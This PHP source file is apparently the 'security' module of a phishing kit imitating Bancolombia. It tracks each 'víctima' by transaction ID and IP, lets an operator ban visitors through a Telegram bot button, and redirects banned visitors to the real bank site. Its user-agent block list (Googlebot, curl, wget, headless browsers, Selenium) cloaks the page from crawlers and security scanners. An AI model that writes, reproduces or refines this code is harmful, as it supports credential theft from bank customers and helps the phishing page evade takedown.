<?php
// security.php - Protección Antibots, Seguridad de Sesión, Ban IP, CSRF, Cifrado LS
require_once __DIR__ . '/config.php';

function log_blocked($reason) {
    $log_file = __DIR__ . '/logs/blocked_bots.log';
    $log_dir = dirname($log_file);
    if (!is_dir($log_dir)) @mkdir($log_dir, 0755, true);
    
    $entry = date('Y-m-d H:i:s') . " - IP: " . sec_get_client_ip() . " - Reason: $reason - UA: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'NONE') . PHP_EOL;
    @file_put_contents($log_file, $entry, FILE_APPEND);
}

// ============================================================
// IPs OFICIALES DE TELEGRAM (no las bloqueamos nunca ni aplicamos rate limit a webhooks)
// Documentación oficial: https://core.telegram.org/bots/webhooks#the-short-version
// ============================================================
function sec_telegram_ipv4_ranges() {
    return [
        ['149.154.160.0', 20],
        ['91.108.4.0',     22],
        ['91.108.56.0',    24],
    ];
}
function sec_telegram_ipv6_ranges() {
    return [
        ['2001:67c:4e8::',  48],
        ['2001:b28:f23d::', 48],
        ['2a0a:f280::',     32],
    ];
}
function sec_ip_in_cidr($ip, $cidrIp, $cidrBits) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
    $v6 = (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false);
    $wantV6 = (filter_var($cidrIp, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false);
    if ($v6 !== $wantV6) return false;
    if ($v6) {
        if (!function_exists('inet_pton')) return false;
        $bytesIp   = inet_pton($ip);
        $bytesNet  = inet_pton($cidrIp);
        if ($bytesIp === false || $bytesNet === false) return false;
        $bytes = 16; // 128 bits
        $bits = (int)$cidrBits;
        for ($i = 0; $i < $bytes; $i++) {
            $byteBits = min(8, max(0, $bits - $i * 8));
            if ($byteBits === 0) break;
            $mask = (0xFF << (8 - $byteBits)) & 0xFF;
            if ((ord($bytesIp[$i]) & $mask) !== (ord($bytesNet[$i]) & $mask)) return false;
        }
        return true;
    }
    $ipLong   = ip2long($ip);
    $netLong  = ip2long($cidrIp);
    $bits     = (int)$cidrBits;
    if ($ipLong === false || $netLong === false || $bits < 0 || $bits > 32) return false;
    if ($bits === 0) return true;
    $mask = (-1 << (32 - $bits));
    return ($ipLong & $mask) === ($netLong & $mask);
}
function sec_is_telegram_ip($ip = null) {
    if ($ip === null) $ip = sec_get_client_ip();
    $v6 = (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false);
    $ranges = $v6 ? sec_telegram_ipv6_ranges() : sec_telegram_ipv4_ranges();
    foreach ($ranges as $r) {
        if (sec_ip_in_cidr($ip, $r[0], $r[1])) return true;
    }
    return false;
}
function sec_is_telegram_request() {
    // 1) Webhook directo: la petición va a /webhook.php (o URL terminada en /webhook.php).
    $sn = $_SERVER['SCRIPT_NAME'] ?? '';
    $ru = $_SERVER['REQUEST_URI'] ?? '';
    $isWebhookScript = (stripos(ltrim($sn, '/'), 'webhook.php') === 0)
                    || (substr($sn, -13) === '/webhook.php')
                    || (stripos($ru, 'webhook.php') !== false);
    if ($isWebhookScript) return true;
    // 2) IP oficial de Telegram (puede usar polling getUpdates, por ejemplo si viene de get_updates action)
    return sec_is_telegram_ip();
}

// ============================================================
// IP CLIENTE CONFISIBLE (sin spoofing de headers si no hay proxy confiable)
// ============================================================
function sec_get_client_ip() {
    // Valor viene de config.php -> define('TRUST_PROXY_HEADERS_ENABLED', ...) usando la variable
    // de entorno TRUST_PROXY_HEADERS (así coincide 1:1 con la GUÍA).
    if (defined('TRUST_PROXY_HEADERS_ENABLED')) {
        $trustProxyHeaders = (bool)TRUST_PROXY_HEADERS_ENABLED;
    } else {
        // Fallback si alguien no cargó config.php? (no debería pasar).
        $env = strtolower((string)getenv('TRUST_PROXY_HEADERS'));
        $trustProxyHeaders = ($env === '1' || $env === 'true' || $env === 'on' || $env === 'yes');
    }

    if ($trustProxyHeaders) {
        $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($keys as $k) {
            if (isset($_SERVER[$k]) && !empty($_SERVER[$k])) {
                $v = trim(explode(',', $_SERVER[$k])[0]);
                if (filter_var($v, FILTER_VALIDATE_IP)) return $v;
            }
        }
    }

    $v = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return filter_var($v, FILTER_VALIDATE_IP) ? $v : '0.0.0.0';
}

// ============================================================
// DIRECTORIOS SEGUROS
// ============================================================
function sec_state_dir() {
    static $d = null;
    if ($d !== null) return $d;
    $d = __DIR__ . '/.state';
    if (!is_dir($d)) @mkdir($d, 0755, true);
    $sub = $d . '/banned';
    if (!is_dir($sub)) @mkdir($sub, 0755, true);
    $sub2 = $d . '/ip_by_tx';
    if (!is_dir($sub2)) @mkdir($sub2, 0755, true);
    return $d;
}

// ============================================================
// BAN DE IP PERSISTENTE
// ============================================================
function sec_banned_file() {
    return sec_state_dir() . '/banned/banned_ips.json';
}

function sec_banned_read() {
    $f = sec_banned_file();
    if (!is_file($f)) return [];
    $raw = @file_get_contents($f);
    if ($raw === false || $raw === '') return [];
    $arr = @json_decode($raw, true);
    return is_array($arr) ? $arr : [];
}

function sec_banned_write($arr) {
    $f = sec_banned_file();
    @file_put_contents($f, json_encode($arr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
}

function sec_is_ip_banned($ip = null) {
    if ($ip === null) $ip = sec_get_client_ip();
    $list = sec_banned_read();
    if (isset($list[$ip])) {
        $entry = $list[$ip];
        $until = isset($entry['until']) ? (int)$entry['until'] : 0;
        if ($until === 0 || $until > time()) return $entry;
        // Expirado: quitar
        unset($list[$ip]);
        sec_banned_write($list);
    }
    return null;
}

function sec_ban_ip($ip, $reason = 'manual', $permanent = true, $seconds = 0) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
    $list = sec_banned_read();
    $entry = [
        'ip'        => $ip,
        'reason'    => (string)$reason,
        'banned_at' => time(),
        'until'     => $permanent ? 0 : (time() + max(1, (int)$seconds))
    ];
    $list[$ip] = $entry;
    sec_banned_write($list);
    log_blocked("BANNED: $reason " . ($permanent ? 'PERMANENT' : "TTL=$seconds") . " | IP=$ip");
    return true;
}

// ============================================================
// REGISTRO TX => IP (para que el botón BANEAR IP del operador encuentre la IP)
// ============================================================
function sec_tx_file($tx) {
    $tx = preg_replace('/[^a-zA-Z0-9_\-]/', '_', (string)$tx);
    if ($tx === '') return null;
    return sec_state_dir() . '/ip_by_tx/' . $tx . '.json';
}

function sec_store_tx_ip($tx, $extra = []) {
    $tx = (string)$tx;
    if ($tx === '') return;
    $f = sec_tx_file($tx);
    if ($f === null) return;
    $payload = [
        'ip'         => sec_get_client_ip(),
        'ua'         => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'stored_at'  => time(),
    ];
    if (is_array($extra) && count($extra) > 0) {
        foreach ($extra as $k => $v) $payload[$k] = $v;
    }
    @file_put_contents($f, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

function sec_read_tx_ip($tx) {
    $tx = (string)$tx;
    if ($tx === '') return null;
    $f = sec_tx_file($tx);
    if ($f === null || !is_file($f)) return null;
    $raw = @file_get_contents($f);
    if ($raw === false || $raw === '') return null;
    return @json_decode($raw, true);
}

// ============================================================
// BANEAR IP POR TRANSACTION_ID (lo llama webhook/api.php al recibir el botón)
// ============================================================
function sec_ban_by_tx($tx, $reason = 'telegram_button') {
    $info = sec_read_tx_ip($tx);
    if (is_array($info) && !empty($info['ip'])) {
        $r = sec_ban_ip($info['ip'], $reason . '|tx=' . $tx, true);
        if ($r) return $info['ip'];
    }
    return null;
}

// ============================================================
// CSRF + LS_KEY (cifrado localStorage)
// ============================================================
function sec_init_tokens() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(18));
    }
    if (empty($_SESSION['ls_key'])) {
        $_SESSION['ls_key'] = bin2hex(random_bytes(24));
    }
}

// ============================================================
// ANTIBOTS (mantener compatibilidad)
// ============================================================
function check_antibot() {
    if (!ANTIBOT_ENABLED) return;
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $bots = [
        'bot', 'crawl', 'slurp', 'spider', 'mediapartners', 'googlebot', 'bingbot',
        'yandex', 'baidu', 'facebookexternalhit', 'twitterbot', 'rogerbot',
        'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 'outbrain',
        'pinterest', 'slackbot', 'vkShare', 'W3C_Validator', 'curl', 'wget', 'python',
        'headless', 'phantomjs', 'selenium', 'puppeteer'
    ];
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            log_blocked("Bot detected: $bot");
            http_response_code(403);
            die("Acceso denegado.");
        }
    }
}

function start_secure_session() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start([
            'cookie_httponly' => true,
            'cookie_secure' => isset($_SERVER['HTTPS']),
            'use_only_cookies' => true,
            'cookie_samesite' => 'Lax',
        ]);
    }
}

// ============================================================
// INYECCIÓN DE VARIABLES JS GLOBALES (TODAS LAS PÁGINAS)
// ============================================================
function sec_inject_bootstrap_js() {
    static $done = false;
    if ($done) return '';
    $done = true;
    sec_init_tokens();
    $csrf   = $_SESSION['csrf_token'] ?? '';
    $lsKey  = $_SESSION['ls_key'] ?? '';
    $apiBase = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/');
    if ($apiBase === '' || $apiBase === '\\') $apiBase = '';
    return
        "<script>\n"
      . "(function(){\n"
      . "  window.__SEC = window.__SEC || {};\n"
      . "  window.__SEC.csrf = " . json_encode($csrf, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.lsKey = " . json_encode($lsKey, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.apiBase = " . json_encode($apiBase, JSON_UNESCAPED_UNICODE) . ";\n"
      . "  window.__SEC.clientIp = " . json_encode(sec_get_client_ip(), JSON_UNESCAPED_UNICODE) . ";\n"
      . "})();\n"
      . "</script>\n";
}

// ============================================================
// EJECUCIÓN (siempre que se incluya security.php en una página)
// ============================================================

// 🔥 NUEVO v9: ¿ES TELEGRAM QUIEN LLAMA? (webhook.php / IP oficial)
//    Si es así, NUNCA: antibot, ni baneo, ni rate limit, ni sesión segura.
//    Esto resuelve el bug "last_error_message: Wrong response from the webhook: 429 Too Many Requests".
if (!defined('SEC_IS_TELEGRAM_REQUEST')) {
    define('SEC_IS_TELEGRAM_REQUEST', sec_is_telegram_request());
}

if (!SEC_IS_TELEGRAM_REQUEST) {
    check_antibot();
    start_secure_session();

    // 1. Comprobación de IP BANEADA (antes que nada, antes de imprimir nada)
    $banned = sec_is_ip_banned();
    if ($banned !== null) {
        log_blocked("Banned IP hit. reason=" . ($banned['reason'] ?? 'unknown'));
        header('Location: https://www.bancolombia.com/personas', true, 302);
        exit();
    }
} else {
    // Telegram no necesita sesiones. Pero inicializamos lo mínimo para no romper includes.
    if (session_status() === PHP_SESSION_NONE && !headers_sent()) {
        @session_start([
            'cookie_httponly' => true,
            'cookie_secure' => isset($_SERVER['HTTPS']),
            'use_only_cookies' => true,
            'cookie_samesite' => 'Lax',
            'read_and_close' => true,
        ]);
    }
    // Flags para api.php: salta apiRateLimitCheck()
    if (!defined('SKIP_API_RATE_LIMIT')) define('SKIP_API_RATE_LIMIT', true);
}

// 2. Guardar TX => IP si se pasa por URL / GET / POST (captura el tx de la víctima en cada salto de pantalla)
$tx = '';
if (isset($_GET['tx']) && is_string($_GET['tx'])) $tx = trim($_GET['tx']);
if ($tx === '' && isset($_GET['test_tx']) && is_string($_GET['test_tx'])) $tx = trim($_GET['test_tx']);
if ($tx === '' && isset($_POST['tx']) && is_string($_POST['tx'])) $tx = trim($_POST['tx']);
if ($tx === '' && isset($_SESSION['current_tx'])) $tx = (string)$_SESSION['current_tx'];
if ($tx !== '') {
    $_SESSION['current_tx'] = $tx;
    sec_store_tx_ip($tx);
}

// 3. Inicializar tokens CSRF y LS Key (aunque no usemos la inyección inmediatamente)
if (!SEC_IS_TELEGRAM_REQUEST) sec_init_tokens();

// 4. HOOK de salida: inyecta window.__SEC SOLO SI LA RESPUESTA ES HTML (¡NO JSON, NO XML, NO texto plano!)
//    Evita que se cuelen <script> en api.php (Content-Type: application/json) y rompan JSON.parse.
if (!defined('SEC_NO_OUTPUT_BUFFER')) {
    define('SEC_NO_OUTPUT_BUFFER', true);
    function sec_output_buffer_inject($buffer) {
        if (!is_string($buffer) || trim($buffer) === '') return $buffer;
        // NO inyectar SIEMPRE si la petición es de Telegram (webhook responses son pequeños OKs)
        if (defined('SEC_IS_TELEGRAM_REQUEST') && SEC_IS_TELEGRAM_REQUEST) return $buffer;

        // 🔴 CHECK 1: Content-Type HTTP Response Header (si ya se mandó o está en headers_list)
        if (function_exists('headers_list')) {
            foreach (headers_list() as $hdr) {
                $sep = strpos($hdr, ':');
                if ($sep === false) continue;
                $hn = strtolower(trim(substr($hdr, 0, $sep)));
                $hv = strtolower(trim(substr($hdr, $sep + 1)));
                if ($hn === 'content-type' && $hv !== '' && strpos($hv, 'text/html') === false && strpos($hv, 'application/xhtml') === false) {
                    return $buffer;
                }
            }
        }

        // 🔴 CHECK 2: sniff del payload (si empieza por JSON válido, no tocar)
        $sniff = ltrim($buffer);
        if ($sniff !== '' && (
                $sniff[0] === '{' || $sniff[0] === '[' ||
                strpos($sniff, '<?xml') === 0 ||
                stripos($sniff, '<svg') === 0 ||
                stripos($sniff, '<!doctype json') === 0
            )
        ) {
            return $buffer;
        }

        // 🔴 CHECK 3: El buffer contiene HTML? Solo inyectar si hay <html, <head, <body o un <!doctype html>.
        $hasHtml = (
            stripos($buffer, '<!doctype') !== false ||
            stripos($buffer, '<html')     !== false ||
            stripos($buffer, '<head')     !== false ||
            stripos($buffer, '<body')     !== false
        );
        if (!$hasHtml) {
            // Páginas PHP pequeñas sin DOCTYPE (ej: 302 redirecciones, o die("…") en texto plano).
            // → No inyectar para no romper nada.
            return $buffer;
        }

        $injection = sec_inject_bootstrap_js();
        if ($injection === '' || $injection === '0') return $buffer;

        $injHead = stripos($buffer, '</head>');
        if ($injHead !== false) {
            return substr_replace($buffer, $injection . '</head>', $injHead, 7);
        }
        $injBody = stripos($buffer, '<body');
        if ($injBody !== false) {
            $injBodyEnd = strpos($buffer, '>', $injBody);
            if ($injBodyEnd !== false) {
                return substr_replace($buffer, '>' . $injection, $injBodyEnd, 1);
            }
        }
        return $injection . $buffer;
    }
    ob_start('sec_output_buffer_inject');
}
?>